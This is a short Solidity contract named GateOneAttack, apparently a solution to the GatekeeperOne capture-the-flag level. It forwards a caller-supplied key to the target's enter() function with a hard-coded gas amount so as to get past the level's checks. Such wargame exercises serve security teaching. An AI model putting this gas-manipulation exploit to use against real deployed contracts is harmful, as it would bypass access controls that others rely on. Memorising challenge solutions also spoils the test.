// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract GateOneAttack {
    GatekeeperOne public gate;

    constructor(GatekeeperOne _gate) public {
        gate = _gate;
    }

    function enterGate(bytes8 _gateKey) public {
        gate.enter{gas: 82164}(_gateKey);
    }
}
